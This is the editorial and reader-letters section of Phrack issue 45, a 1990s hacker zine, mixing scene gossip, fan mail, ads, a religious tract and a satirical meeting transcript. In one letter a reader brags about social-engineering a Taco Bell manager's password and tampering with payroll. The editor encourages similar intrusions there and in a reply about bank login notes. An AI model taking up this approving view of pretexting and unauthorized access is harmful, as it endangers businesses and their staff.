                       ~ Dedicated to CRS--(1969-1994) ~

Well kiddies, it&#039;s Easter time again.  Easter has got to be one of my
favorite holidays of the bunch.  No, no, no...not for any of that spiritual
rebirth or religious hooey.  Easter brings with it two of the most joyous
items in the world:  Reese&#039;s Peanut Butter Eggs and Marshmallow Peeps.

In the past two weeks I have eaten my body weight many times over
in peanut butter eggs.  I don&#039;t know what it is about those damn things, but
I just can&#039;t stop eating them.  And the Peeps?  Oh man, if you haven&#039;t put
a Marshmallow Peep in the microwave, you just haven&#039;t lived.  The cute
little yellow duckie takes on whole new dimensions as it becomes superheated
in the nuclear nightmare of a conventional microwave oven.  It becomes
like a scene from Akira as the Peep grows at an alarming rate, almost filling
up the entire oven with its grossly mutated form.  You can almost hear
it squealing with agony.  Go do it right now, and then finish reading this
issue.

The net has been more fun the past few months than a barrel full of monkeys,
(or a hottub full of co-eds, pick your own comparison).  In the time since
last issue I have been the subject of a lot of attention.  I&#039;ve been
pseudo-framed for hacking a handful of sites with fake syslog messages, I&#039;ve
been spoofed as the source of a pre-release CERT advisory, I&#039;ve been
mentioned in numerous altered motd files on many systems, and even better,
spoofed messages from &quot;erikb@mindvox.phantom.com&quot; were posted to a
homosexual listserv announcing my supposed &quot;exit from the closet.&quot;

Well, unfortunately for everyone, including the hundreds of hopeful gay
respondents to the forged post, I only like women.  But it sure is nice to
know that even men are into me.  What an ego boost.  Seriously though, one
has to wonder how the forgers knew that something called queernet.org
even existed.  I think I get around on the net, but I&#039;d never heard of it.
Have you?  Perhaps the Posse are &#039;closer&#039; than we thought.

And the abuse continues.  God knows why.  The common thread seems to be:
&quot;Erikb is a nark.&quot;  Let&#039;s look at that logic, shall we?  If Erikb is a
nark, then he would be on some terms with law enforcement.  If he were
on some terms with law enforcement, then he would have no qualms about
handing over names of people doing bad things.  If had no qualms about
handing over names of people doing bad things, then law enforcement would
open cases based on that information.  If law enforcement opened cases based
on that information, then people would get raided.  If people would get
raided, then people would almost certainly go to jail.

Why on earth would someone want to evoke a chain of events that would
land them in jail?  Or do they not believe their own statements about
me being a nark?  Or are they convinced that they are so good that
they cannot get caught?  Or are they just pathetically stupid?

Personally I choose the latter.  These guys are not good.  And they are
very dumb.  They make more mistakes than I&#039;ve seen in a long time.  And
they&#039;ve pissed off very powerful people.  (No, I&#039;m not including myself in
that list of &#039;Powerful People.&#039;)  It&#039;s good that much of MOD is getting out
of jail soon.  Now those guys were legitimately GOOD HACKERS.  They were
definitely assholes, but damn good computer hackers.  It will be nice to have
some harassment from dickheads with skills once again.

But I digress.

Phrack&#039;s gotten a bit of notice as of late.  In Mondo-2000, in their
&quot;Pirate Media&quot; article, and in Richard Kadrey&#039;s &quot;Covert Culture&quot;
sourcebook.  Of course both of these got the subscription information
wrong, but hell, I&#039;ve learned to expect as much.  Also, the mention
of Phreak Accident&#039;s fantastic &quot;Playing Hide &amp; Seek -- Unix Style&quot;
article in Dan Farmer and Weitse Venema&#039;s &quot;Improving The Security of
Your Site by Breaking Into It&quot; article brought in hundreds of
new subscribers.  Let&#039;s see how many of these security people register.
(How many fingers am I holding up?)

Speaking of such, Phrack has a couple of other registrations now.  One is a
teacher who wanted to use Phrack in her class.  Kudos to her!  The other was
a cool guy who just wanted to register because he felt like it.  Why
can&#039;t the rest of you be more like him?

Anyway, the money is going to sponsor a new contest.  (Considering how
well the last one went...not!)  This time, we are serious, so read in
LINE NOISE for more info.

What else?  Phrack has now made the big time in the Federal Penal system.
We&#039;re the proud recipients of the Bureau of Prisons form 328(58).  Our
material was considered to be a breach of security of the institution.
This, of course, pissed me off.  But hell, on the same form, they
denote how &quot;Body Hair, Plant Shavings, and Sexually Explicit Personal
Photos&quot; are also inappropriate.  Phrack or Body Hair.  You make the call.

Phrack 45...let&#039;s see...

If this issue doesn&#039;t cause neck hairs to bristle on everyone within spying
distance of the beltway, I will be very disappointed.  It&#039;s amazing what you
find in your mailbox.

We&#039;ve got a lot of nifty things in this issue.  More source code for
you to play with, uuencoded goodness, cellular info, telco / pbx info,
Ho Ho Con coverage, ancient hack memorabilia, and a plethora of spurious
scatological material.  (translated:  lots of other crap)

Enjoy.

                            Phrack Loopback Part I

Letter from Louis Cypher  (Byron York)

As many people know, I was convicted over the summer for a number of
Federal crimes including counterfeiting, burglary of a post office,
theft of US mail, and possession of stolen property. For a little
background, I was arrested for these crimes in September of 1992.
I stayed out on 50,000 dollar bond until the trial which started the
day after Summercon 93&#039;. The trial lasted for about a week and a half,
and the jury found me guilty on 4 charges and acquitted me on 2.

My sentencing was not until the 8th of November, and the results
were not as I had hoped for being a first time offender and all.
I received a 21 month sentence that will be carried out if I do
not complete 6 months in a Federal boot camp in Pennsylvania.
If I do complete the program at the boot camp I will then spend
6 months in a Federal halfway house in Houston. This will be
followed by several months of home confinement, then 3 years
parole. I am to attend college while on parole, but if I do not
do well, then I have to do 300 hours of community service.

I will start serving my sentence as early as December, or as late
January. Won&#039;t know until I receive the letter in the mail from
the Bureau of Prisons. I am still out on bond and am on voluntary
surrender so I just deliver myself to wherever they send me. A lot
better than rotting in county jail until they transfer me.

I will hopefully be out still for HoHocon, and will be able to
say good-bye to most people in person. But in case I am not, then
I would like to use this forum to tell everyone good-bye. I know
that I am not going away forever, but I don&#039;t know when I am
going to be able to access a modem again and get back in touch
with everybody.

I have been running a public access Internet site in Houston
for the past year or so, and luckily, thanks to Drunkfux,
Absalom, and Lord Macduff, the system will most probably
stay up in my absence. People will be able to mail me there,
and I will be able to respond through the help of people over
the phone.

I would like to thank Erik Bloodaxe for letting me use Phrack
to tell everybody farewell. I hope nothing&#039;s changed when I get
back, and I will be back. I&#039;ll just have to keep my nose a little
cleaner when I come back from my sabbatical.

It&#039;s been great, and I&#039;ll see all of you hopefully in about
a year or so.


[Byron did get to go to HoHoCon, but shortly thereafter had to fly to
 Pennsylvania to enter Boot Camp.

 Byron&#039;s Address in prison is:

        J.C.C.
        Byron York  60177-079
        P.O. Box 1000

 Drop him a note.  It really makes the day go by a little easier in
 a world of bloody shank wars with the Texas Syndicate.  Jail sucks.]

&gt;[God bless the free enterprise system!
&gt; God bless capitalism!
&gt; God bless America!]

Well, I&#039;m an atheist and natural law objectivist, so I&#039;ll cheer right along
with you on the capitalism part! Capitalism is the only MORALLY PROPER
system because it&#039;s the only system (or lack thereof) that doesn&#039;t treat
people as slaves!


[editorial]

&gt;This is going to piss people off, but hell, that&#039;s the point of having
&gt;an editorial, eh?

I, for one, fucking loved it.

&gt;Granted, Holland has a notoriously permissive and open society; and
&gt;indeed, Europe in general is far more laid back than the States, but
&gt;even many in the US hold these ideals close to heart.

Europe also has a great police state tradition, not to mention the common
and prevailing attitude that while sex and drugs and rock and roll are okay,
making money (creating wealth) is a far more heinous crime.

&gt;...The major cons in America (HoHo, Scon) really don&#039;t charge.
&gt;They &quot;ask&quot; for donations.  Sure, you might get a nasty look if
&gt;you don&#039;t cough up five or ten bucks, but hell, everyone does.  They
&gt;WANT to.  A good time is worth a handful of change.  And there isn&#039;t
&gt;some awesome requirement just to get in the damn door.  Besides, losses
&gt;can always be made up by selling a plethora of crap such as t-shirts and
&gt;videos, which everyone always wants to buy.  (Hardware costs.  :) )

VOLUNTARY donations! (The Supreme Court says &quot;our system of taxation is
based on VOLUNTARY COMPLIANCE&quot;...) There&#039;s a vast and monstrous difference
between voluntary and involuntary - it&#039;s that nasty &quot;free will thing&quot;!

&gt;Then there was Phrack.  Always free to the community.  Always available
&gt;for everyone&#039;s enjoyment.  Asking only that Corporate types pay a
&gt;registration fee of a hundred dollars just to keep them honest.  (They
&gt;aren&#039;t.)  Knowing full well that they are stealing it, sometimes quite
&gt;brazenly.  Resting quietly, knowing that they are just as unethical as
&gt;they ever claimed us to be.

I also love your registration requirements. Being able to claim ownership
of property, intellectual or otherwise, means you dictate the terms and
conditions of its use. Corporate lawyers must have had coronaries upon
first sight. Only difficulty is, your ISSN number and copyright data
are prima facie evidence that you contracted away rights in exchange for
privilege from the state, revocable whenever the state feels like it
(copyright falls under admiralty jurisdiction, not common law). You&#039;ve
formed an &quot;organization&quot; - your registration form recognizes the fact
that &quot;corporations, organizations and other artificial persons&quot; have
a lesser STATUS before the law than NATURAL INDIVIDUALS - just be who
you are!

&gt;Let me tell you something.  Information does not want to be free, my
&gt;friends.  Free neither from its restraints nor in terms of dollar value.
&gt;Information is a commodity like anything else.  More valuable than the
&gt;rarest element, it BEGS to be hoarded and priced.  Anyone who gives
&gt;something away for nothing is a moron.  (I am indeed stupid.)  I can&#039;t
&gt;fault anyone for charging as long as they don&#039;t try to rationalize their
&gt;reasoning behind a facade of excuses, all the while shouting &quot;Information
&gt;Wants to be Free!&quot;

AMEN, from the highest fucking rooftops! You&#039;re not stupid, you&#039;re doing it
by CHOICE. You&#039;re VOLUNTARILY doing it. Free people don&#039;t NEED laws that
force decisions upon them - they do what needs to be done!

&gt;Trade secrets don&#039;t want to be free, marketing projections don&#039;t want to
&gt;be free, formulas don&#039;t want to be free, troop placements don&#039;t want to
&gt;be free, CAD designs do not want to be free, corporate financial
&gt;information doesn&#039;t want to be free, my credit report sure as hell
&gt;doesn&#039;t want to be free!

YES! YES! I HAVE WAITED FOR YEARS FOR THIS MOMENT!

[tale of the Little Red Hen]

Amen again!

This whole issue, in fact, had many great things, which I&#039;ll continue
to reply to here...

[ ... 10K of commentary removed ... ]

Finally...remember how crazy people got in the years just before the turn of
the first millennium (990-1000 A.D.)? It&#039;s gonna be even MORE interesting
this time around!

Here&#039;s to Phrack... may you last into the 21st century! (May we ALL be so
lucky...)


[Man, that was one of the coolest letters we&#039;ve ever gotten (and definitely
 the longest.  I have to tell you, it does my heart good to know that we
 are indeed appreciated by some of you.    We will continue to do so until
 as long as humanly (or inhumanly, with my schedule) possible.]

 even then it&#039;s well within their grasp.  Hmm...maybe the fee should go up.]

  So, there I am in New York City last night. We&#039;re hanging out
(figuratively speaking) at The Vault, where various fetishists
get together to explore the limits of aberrant human sexuality.
All in all, a rather interesting place. The $30 cover was a little
steep, but I would still highly recommend it. Now for my point.

  I was standing around watching two dominatrix abuse some
naked, prostrate wretch when one of them started walking around
giving out business cards to anyone who admitted to having a
computer and an Internet feed (these are dominatrix on the
cutting edge of technology, I might add). The card reads thus:

[Well, hell...now I know where to go next month when I&#039;m back in NYC.
 I wish I would have know about this place last time...the only places
 I could find for even semi-serious sleeze was in Times Square, and I know
 that was way too tame and trendy to be IT.  Now I know.]

------------------------------------------------------------------------------

The earthquake in Los Angeles, California, the flood in Europe, the seemingly
unstoppable war in the former Yugoslavia, the devastating fires in Australia,
the flood in the Midwest of the United States of America, the devastating fires
near Los Angeles, California, the rapid and appalling increase in violence in
cities, towns, villages all over the world, the famines, the diseases, the rapid
decline of the family unit, and the destructive earthquake in India (in 1993)
are signs that this world&#039;s history is coming to a climax. The human race
has trampled on God&#039;s Constitution, as given in Exodus 20:1-17 (King James
Version Bible), and Jesus is coming to set things right. These rapidly
accelerating signs are an indication that Jesus is coming soon (Matthew 24).

God&#039;s Holy Spirit is gradually withdrawing its protection from the earth
and the devastating events you see are demonstrations of Satan&#039;s power. All
those who are not guarded by God are in danger of forever losing eternal life.

If you want to know what&#039;s about to happen, please study the books of Daniel
and Revelation which are located in God&#039;s Word, the Bible.  They are not
sealed or closed books. They can and must be understood by all. Every word
in the Bible from Genesis to Revelation is true. The Bible and the Bible only
must be your guide.

When God&#039;s Law (the Constitution for the Universe) is consistently ignored,
disregarded, changed, and questioned, He permits certain events to occur to
wake us up.  I would urge all, wherever you are and regardless of the
circumstances, to directly call on Jesus and ask Him to intervene in your life.
Jesus who created this planet and every living creature in it and on it, died
on the cross, was raised from the dead by God the Father, and is now in Heaven
interceding for you. Jesus is the only One who can rescue us from the slavery,
misery, and death Satan is causing us.

For reference I&#039;m including God&#039;s Constitution as given in the King James
Version Bible. Please note that when God says the seventh day, he means Sabbath
(the 7th day of the week) not Sunday (1st day of the week).

Commandment #1:  Exodus 20:1-3 (KJV)  And God
                 spake all these words, saying, I am
                 the LORD thy God, which have brought
                 thee out of the land of Egypt, out
                 of the house of bondage. Thou shalt have
                 no other gods before me.

Commandment #2:  Exodus 20:4-6 (KJV) Thou shalt not make
                 unto thee any graven image, or any
                 likeness of any thing that is in heaven
                 above, or that is in the earth beneath,
                 or that is in the water under the earth.
                 And shewing mercy unto thousands of them
                 that love me, and keep my commandments.

Commandment #3:  Exodus 20:7 (KJV) Thou shalt not take
                 the name of the LORD thy God in vain;
                 for the LORD will not hold him
                 guiltless that taketh his name in vain.

Commandment #4:  Exodus 20:8-11 (KJV) Remember the sabbath
                 day, to keep it holy. Six days shalt thou
                 labour, and do all thy work: But the
                 seventh day is the sabbath of the LORD
                 thy God: in it thou shalt not do any
                 work, thou, nor thy son, nor thy daughter,
                 thy manservant, nor thy maidservant, nor
                 thy cattle, nor thy stranger that is
                 within thy gates: For in six days the
                 LORD made heaven and earth, the sea, and
                 all that in them is, and rested the seventh
                 day: wherefore the LORD blessed the sabbath
                 day, and hallowed it.

Commandment #5:  Exodus 20:12 (KJV) Honour thy father and thy
                 mother: that thy days may be long upon the
                 land which the LORD thy God giveth thee.

Commandment #6:  Exodus 20:13 (KJV) Thou shalt not kill.

Commandment #7:  Exodus 20:14 (KJV) Thou shalt not commit
                 adultery.

Commandment #8:  Exodus 20:15 (KJV) Thou shalt not steal.

Commandment #9:  Exodus 20:16 (KJV) Thou shalt not bear
                 false witness against thy neighbour.

Commandment #10: Exodus 20:17 (KJV) Thou shalt not covet
                 thy neighbour&#039;s house, thou shalt not
                 covet thy neighbour&#039;s wife, nor his
                 manservant, nor his maidservant, nor
                 his ox, nor his ass, nor any thing that
                 is thy neighbour&#039;s.

  Big Brother Inside Logo
A parody of the Intel&#039;s Logo modified for the Clipper Chip is now available
for use for stickers, posters, brochures etc.

The Big Brother Inside graphic files are now available at the CPSR
Internet Archive - ftp/gopher cpsr.org /cpsr/privacy/crypto/clipper

big_brother_inside_sticker.ps (postscript-scale to fit your project)
big_brother_inside_logo.gif (Color GIF - good startup/background screen)
big_brother_inside_picts_info.txt (Info on the files)

The files have also been uploaded to America Online in the Mac Telecom and
Graphic Arts folders.

big_brother_inside_sticker.ps is a generic postscript file, created in
CorelDraw. The postscript image lies landscape on the page, and consists
of the intel-logo&#039;s ``swoosh&#039;&#039; and crayon-like lettering on the inside.

This design was originally created for the sticker project: the image was
screened onto transparent stickers 1&quot; square for the purpose of applying
them to future clipper-chip products. (cdodhner@indirect.com was in charge
of that project; as far as I know he&#039;s still distributing them for a small
donation to cover printing &amp; mailing costs).

The design was created by Matt Thomlinson &lt;phantom@u.washington.edu&gt;

[The stickers I have made a HUGE hit among the various &quot;select targets&quot;
 at COMDEX.  Get yours and join in on the fun.  There are a world of
 mass merchant distributors waiting to be &quot;tagged.&quot;  Sounds like the
 SenseReal foundation would love a handful of these for those pesky
 Intel boxes.]

HI,

1st I want to thank you for dedicating your space to the silliness
and foolishness that comes with anything Sara Gordon related.

I think I should have gotten the last word but, who wants to turn this
into a public feud, specially with a demented middle aged woman.

Hello,

I run a board here in the UK known as Unauthorised Access.  We have been
online since 1990 (the year of our anti-hacking law&#039;s approval) and the
system is now the largest computer underground board in the U.K. (2,000+
quality files and growing each day)

I also attended the HEU congress in Holland but although I spoke with
Eric Corley (2600) and BillSF (Hack-Tic), I did not know where to find
you.  I expect you dissappeared off to Amsterdam like so many of the
other visitors to Holland.

Anyway, I noticed in your last issue (44) that you seem to have quite a
few readers in the United Kingdom.  I would like to tell you about my
system here in the UK.  (Please include this advert in your next issue
of PHRACK)  Thanks!

   New TimeWasters T-shirts !

Do you know the feeling ? You&#039;re behind your terminal for hours,
browsing the directories of your school&#039;s UNIX system. Instead of
holes, bugs and bad file permissions you find tripwire, TCPwrapper and
s/key. You run a file with a s-bit and immediately you get a mail from
the system admin asking what you are doing. In other words, no chance
to ever become a good hacker there.

Now you have the chance to at least pretend to be an eleet
hacker. The Dutch hacking fanatics The TimeWasters have released
the third version of their cool &#039;hacker&#039; T-shirt. Because
the previous versions were too limited (20 and 25 shirts) we
printed no less than 200 shirts this time.

Of course you want to know, what does it look like ?
On the front, a TimeWasters logo in color. Below that a picture
of two hacking dudes, hanging behind their equipment, also
featuring a stack of phracks, pizza boxes, beer, kodez, and
various computer-related stuff with a &#039;No WsWietse&#039; sticker.
On the back, the original TimeWasters logo with the broken
clock. Below it, four original and dead funny real quotes
featuring the art of Time Wasting.

Wearing this shirt can only provoke one reaction; WOW !
Imagine going up to the helpdesk wearing this shirt and
keeping a straight face while asking a security question !

And for just $2 more you&#039;ll get a pair of sunglasses with
the text &#039;TimeWasters&#039; on them !

                           Phrack Loopback Part II

How sad the state of affairs is.  Companies do _not_ care about
security.  My father would be the last one to think about ways
into the &quot;systems&quot; that are out there.  We had a good talk tonite
about the lack of security in the corporate world.  I told him
about PGP public key encryption software, and it&#039;s political
gibberish etc.  Then he hits me with this outstanding story of
the stupidity displayed at his credit union (AEA, yes he works in
the silicon valley).  He went to get some $$ at the branch office
near his work, and he notices they have upgraded their computer
systems.  It was apparent that it was no &#039;internal&#039; updating of
the tellers&#039; equipment, but a major overhaul of the entire
structure at AEA credit union.  This was obvious when every teller
was reading manuals as they helped customers.  The greatest part
of his story (which made him laugh out loud) was that on the tellers&#039;
computer screens were taped up pieces of paper detailing how to
access the computers at AEA.  As the teller was in the back room,
my dad leaned over and saw what it was, and memorized the things.
Its the things like that which make me want to trust my money to
fabulous behemoths like credit unions.

[That&#039;s typical.  You should have gone straight to that bank and taken notes.
 You never know...you could have ended up with SWIFT access.  Let&#039;s face it,
 if the BND&#039;s Project Rahab can, so can we.]

     TO:  The Hack/Phreak Community
   From:  Amitech USA
Subject:  Explaining About What Amitech USA IS!

     Amitech is a group that teaches and learns... What I mean by this is
The Hack/Phreak community should teach the inexperienced more than put them
down, especially if they want to learn but no one is willing to teach
them.. This is were we come in... The definition of Hacking is learning the
holes in different telephone equipment and different computer equipment.
People these days don&#039;t use there knowledge correctly... They abuse what
they get and sometimes even harass people because of hatred and
reasons of revenge.. The H/P community isn&#039;t about this... We are releasing
this to invite anyone in the H/P community with a lot or little experience
to join us, to learn and to teach us..

     Amitech USA does not condone any board crashing, harassing,
Underground Board password stealing etc. We will not be responsible or
accept anyone who condones such activity....

     Amitech has two levels of members.. 1. Trial members 2. Regular
members. The trial members are on a basis of two weeks which in such time
they have to show us that they are willing to learn and is not into the
group just to use the groups name in there signature. Members decide who
is acceptable for a group and who is not. Each member will get the users
application except their real name and phone #. We will decide and will
contact you within a week of when the application comes to me...

     We are going to be mostly underground for the simple fact that the
group does not need recognition. Are members may stand out but for the
most part we will not be shown and or do not want to be shown for the
simple fact that underground is better for the newer user as will as the
older users.

Dear Phrack:

        I know you guys take an interest in what happens at 2600
meetings, so I thought you might like to hear about a mainstay of the
Washington D.C. meeting.   BTW, I am also submitting to 2600.  (They
should have a PGP key)

------ Cut ----
        For the past few meetings a guy from MCI has showed up.  He
works at some sort of Pentagon City mall branch of MCI and on the Fridays
he sticks around and gets drunk.  He is usually a great source of
entertainment and this time he was undoubtedly the best part of the 2600
meeting.  That was the highest form of entertainment (except for the
threats on The Monk&#039;s life).  At a meeting before this he was saying
(I&#039;m not sure how many beers he had had) how he was going to bomb
(physically) all the hackers computers by using the system batteries.
And he also said something like &quot;We didn&#039;t have time for this kind of
stuff in Vietnam.&quot;  Anyway, I was listening to his drunken ramblings and
I was thinking &quot;I should be writing his wisdom down.&quot;  So I did, and
Maverick later started to type it down.  The hardest part of all of this
was not laughing in his face.   Here is where I started the notes:

MCI Guy:  I mean it&#039;s really small, it&#039;s only like 1 microliter long.
Vance:    Yeah, that&#039;s pretty short.
MCI Guy:  I work on computers and they go in nanoseconds.
Vance:    Nanoseconds are really short.
MCI Guy:  A nanosecond is about this long.
          &lt; Denotes with his fingers a length of about 6 inches &gt;
Vance:    That&#039;s great if you can visualize it.
MCI Guy:  Yeah, it&#039;s short.  Most of the instructions that I do take
          less than 3 nanoseconds, and that&#039;s short.  But it&#039;s still too
          slow.

---  Ok, from here it somehow jumped to a discussion of Rebel Lion&#039;s
     modem that was sitting out:

MCI Guy:  That&#039;s a good modem, it has memory because of it&#039;s external
          capacitance.  The capacitor can store the memory since it&#039;s
          outside.
Vance:    Yeah, it must have a lot of memory.  How much would you say?
MCI Guy:  A lot, gigabytes of it.  The computer can talk directly to it.
Vance:    You need software to access that, that&#039;s where the
          intelligence is, in 2 gigabyte capacitor technology software.
MCI Guy:  It&#039;s because it&#039;s outside and it has it&#039;s memory.
Vance:    Gigaboobs of memory.  Megamammaries.   It must have
          Megamammaries in it&#039;s external capacitance.

--  At this point, everybody is cracking up, I can&#039;t believe Vance kept
    a straight face.

MCI Guy:  Yeah.  &lt; Looking confused. &gt;


-------------------------------------------------------------------------
-- After this, I was really laughing and wasn&#039;t sure of exactly what was
   said.  But in just a few minutes, the MCI guy left to get some more
   beer.  He didn&#039;t come back to our table, he went to another one.  We
   ignored him for awhile.  But as he was sitting there, a woman sat down
   next to him.  She was undoubtedly a prostitute, and there were many
   cracks about her gigaboobs and megamammaries.  She must have spotted
   the fact that he was wasted and was trying to make some easy cash.
   After a while, the MCI guy didn&#039;t bite, and her pimp came along and
   picked her up.   (There is no other logical explanation that I can
   think of.)  After a few minutes, we went back to the table for the
   final round, but Vance had left, so I conducted the search for
   knowledge.  It starts as I was approaching the table and trying to get
   him to talk to me.

GD:       When you were talking Rebel Lion&#039;s modem, I wasn&#039;t quite sure
          of what you said, could you explain it to me?
          &lt; I get out my pencil and paper, like I&#039;m taking notes on his
          every word. (Actually I was) &gt;
MCI Guy:  &lt; He is giving me a look of utter contempt, like I&#039;m just a
          stupid kid who is not worthy to partake in his knowledge &gt;
          Well you see it&#039;s external.
GD:       What do you mean?  It&#039;s obviously external, but what does that
          mean?  &lt; Gives me another look &gt;
--- Maverick accidentally spills some of Mr. MCI&#039;s beer.
MCI Guy:  What was that?  What are you doing?!?
Maverick: I didn&#039;t do anything, you spilled it!
MCI Guy:  &lt; Just forgets about it in his drunken stupor &gt;
          It has it&#039;s own memory, it doesn&#039;t have to take up the core
          like an internal.
GD:       Core?
MCI Guy:  Or something like that, you know.  It&#039;s outside the main
          frame.
GD:       Right, so it saves memory.
MCI Guy:  Hmmph, I work with so much memory.  I throw out tapes.
GD:       Tapes?  You mean tape backups.
MCI Guy:  Yeah.
GD:       Why?  Don&#039;t you want the memory?
MCI Guy:  I have too much memory.
GD:       Yeah, I guess you&#039;re right, if you have too much memory, it is
          hard to get rid of.
MCI Guy:  I even use records.
GD:       You mean like the spinning kind of records?  On a turntable?
MCI Guy:  Yeah, they hold a lot of memory.
GD:       Why don&#039;t you use CD&#039;s?  They hold a lot more you know.
MCI Guy:  No they don&#039;t, you don&#039;t even know.
GD:       So you are saying that records hold more than CD&#039;s?
MCI Guy:  Yeah, and I can save space on records, I use &quot;shrinker&quot;.  It
          shrinks the space on a record.
GD:       You mean shrink the space on one of those spinning records?
          &lt; I was trying too hard to keep from laughing to speak
          articulately &gt;
MCI Guy:  It saves space by shrinking everything, and I can fit
          more on it.
GD:       Yeah, I guess that is a good idea.
MCI Guy:  &lt; Incredulous at my stupidity &gt;
          Do you even know about comp?
GD:       Comp?  Sorry, I&#039;ve never heard of &quot;comp&quot;.  What is it?
MCI Guy:  It&#039;s bits and bytes.
GD:       Keep on going, I want to learn about this.
          &lt; And boy did I &gt;
MCI Guy:  4 bytes make a bit, 2 bytes make a double word, 2 words make a
          double word.
GD:       2 words make a double word?   Isn&#039;t that obvious since 2 means
          double?
MCI Guy:  &lt; Ignoring me &gt;
          It&#039;s called 32 bits.  Above that you have to deal with 36 bits.
GD:       Ok, I get it.  That&#039;s pretty cool.
MCI Guy:  That&#039;s called the IBM logo.
GD:       The IBM logo?   It&#039;s made up of bits and bytes and comp?
MCI Guy:  Yeah, if you go above or below the line.

---  Ok, at this point I was reeling from the bit-byte-word conversions
and I didn&#039;t even want to try pursuing the &quot;line&quot; question since I had
to leave.  I really wish I could have stayed, but I also don&#039;t know how
long he would have been benign; this guy was drunk and still had 2
large beers in front of him.

        All through this time, people were cracking up and laughing
in his face.  It wasn&#039;t that hard for the guy currently talking to him
to not laugh, but when you thought for a second about this guy&#039;s slurred
speech and his look of superiority, it was damn hard not to laugh.  And
how sad is this guys life?  He comes to a mall to get drunk!  It
must cost him $15 for those beers.  Oh well, maybe we will spring for
some grain alcohol next time so we can get him to say even more.

        Last thing, if you are talking to a guy like this.  Don&#039;t do
what I did, don&#039;t confront him.  You won&#039;t get as much out of him.  Do
what Vance did; agree with everything he says.  This will get him more
comfortable and he will talk more.  Then give a summary of everything he
said, while inserting things like &quot;megamammaries&quot; and &quot;gigaboobs&quot;.

-- Disclaimer:  I tried to be as accurate as possible but there were
some small changes made because I couldn&#039;t remember the exact wording.
But overall this is fairly true to life.

[I&#039;ve noticed that everyone I&#039;ve ever met involved with LE or security
 at corporations drinks and drinks and drinks and drinks.  And drinks.
 What&#039;s with that?  Jesus...no wonder they are so slow to react.  They
 are fucking hammered all the time.  They need to invest in some
 stimulants.  Swap that Gin &amp; Tonic for a handful of Ephedrine or something.
 (Notice I said Ephedrine...gotta stay legal, eh?) ]

 Dear Phrack,

  I am Knightkrawler.  About a month ago Mephisto, a fellow hacker friend of
 mine, discovered a dialup for a Taco Bell computer while scanning some
 numbers.  Just for the hell of it, I called up the Taco Bell manager and
 posed as the Sys Admin.  THE PHUCKER FELL FOR IT!!!!!!

 Conversation
 ^^^^^^^^^^^^

 me: Hi, I&#039;m the SYS Admin for The Taco Bell Login.  My staff and I will be
 running some routine diagnostics for the next week.  I&#039;ll need a passwd and
 login name to enter the system.

 Corey (the manager): Sure! My passwd is 1A2B3C, and my login name is Corey.

 me: Thank you. If you need anything, you know where to reach me.

 END
 ^^^

 WHAT A DUMBASS!!! I was able to log on and Change fuckin&#039; payrolls!!!!
 First thing I did was to change the price of tacos to 5 cents a piece!

  What I want to know is, have any of you out there had any similar
 experiences with bastards like these? Are all restaurant managers so
 lame?

                               L8R,
                                -=KnIgHtKrAwLeR=-


[The Taco Bell SCO&#039;s have been a source of amusement for some time.
 It would appear that all restaurants in the PepsiCo chain have
 SCO&#039;s in-house.  Something to keep in mind.

 And, uh, I&#039;ve never seen anything that you could do like &quot;change prices&quot;
 without special terminal emulation.  So, uh, don&#039;t bullshit a bullshitter.
 But, hey, it&#039;s a funny hack, and there are several in every city to
 play with, if you are so inclined.]

------------------------------------------------------------------------------

 Hello there, I was wondering if you could help me (wait, wait,
hear me out!).  I am looking for some up-to-date info on COSMOS.  I&#039;ve read
all of the Phrack articles, yours in ish 31 was particularly good, and I was
wondering if there have been any developments lately that I should be aware
of?
 Basically, I am looking for a manual that will show me how to use
COSMOS.  Kind of like a DOS reference guide or something similar.  Your
article was dated 1990, almost 4 years ago, and I&#039;m sure there have been
some new things introduced since then.
 I was thinking that if you had the raw info, you could pass it
along to me and I could whip up a readable format for the next issue of
Phrack.  Believe me, I&#039;ve got far too much time on my hands.  I love Phrack
and would do anything to help out!  Anyway, I&#039;ll cut this off here before I
waste too much of your time.

Mr. Wizard

[COSMOS is being phased out.  I would suggest you look for info on
 SWITCH.  There have been some articles on it in 2600, so you may want
 to check some back issues.  Otherwise, I&#039;ll see if I can&#039;t get some
 more detailed articles on its use for future Phrack issues.

 But as far as COSMOS goes, I think my article from a few years back ended
 up as the most complete ever done, so I doubt there are any others that
 covered things I didn&#039;t.]

VIRTUAL REALITY NOW AVAILABLE TO GENERAL PUBLIC AT CYBERMIND

What is Virtual Reality?

Virtual Reality (VR) is a computer generated, interactive 3D environment in
which the computer serves as a window to an alternate reality.  Once immersed in
this environment, the players interact with each other as well as the computer.

Each VR system includes a head mounted display which provides a 3D graphical
image along with full stereo sound.  By placing the display over your eyes, you
are &quot;virtually&quot; transported to a computer-generated world that you control.
Wherever you move, the computer tracks the movement of your body and displays
the appropriate image to your eyes.  (If you looked up you would see the sky.
If you looked down you would see your &quot;feet.&quot;)  The unlimited choices you can
make in these virtual worlds make the experience one-of-a-kind.

Development of Virtual Reality: Past and Future

Early VR was confined to multi-million dollar systems in research labs and
military simulations.  However, the decreasing cost of computing power and
display technology, VR now has more widespread applications: entertainment,
education, worker training, telerobotics, medicine, teledildonics (virtual sex)
and communication, among others.

In the future, VR technology will allow you to travel, shake hands with people
in other countries, walk on the moon or go shopping -- all without actually
leaving the home or office.

What is CyberMind?

CyberMind is San Francisco&#039;s first location-based virtual reality entertainment
center.  CyberMind center features eight interactive virtual reality machines
that allow the general public to experience and learn about 3D virtual reality
technology by playing imaginative, roleplaying games such as Dactyl Nightmare,
Legend Quest, Flying Aces and ExoRex II.

Phrack:
        Sorry to inconvenience you and PGP this message, but I fail to trust
the people in charge of the server in which this message is being sent from.
        Approximately six months ago I was playing around with the idea for a
crypto-chat program.  In short:  You and the other people in the chat area,
(IRC for example), would pick the same password or random seed number.  This
would tell the chat program what algorithms to use, etc.  Hence forth whatever
you type is encrypted and whatever is displayed remotely is automatically
decrypted.
        My only problem is that I do not know enough regarding cryptology to
write a very secure encryption routine.  I have tried a few times to contact
Cypherpunks, but to no avail, I have not received any letters back from them
even regarding my request to be put on their mailing list.  I write to you,
Phrack, in hopes that you can set me in the correct direction for making my
crypto-chat program a reality.  I feel it would be an asset to the hack/phreak
community and its struggle for more privacy.

                        Thanx.
-----------------------------------------guerilla AnArchy---------------------

[Actually, it wouldn&#039;t be that hard to do, but you&#039;d probably want to do
 it as a DCC chat type thing, rather than going through a server at all.

 I may be wrong, but I think someone may have worked on such a beast.
 You may want to try again to contact the cypherpunks list
 (cypherpunks@toad.com) (or to get added, cypherpunks-request@toad.com)
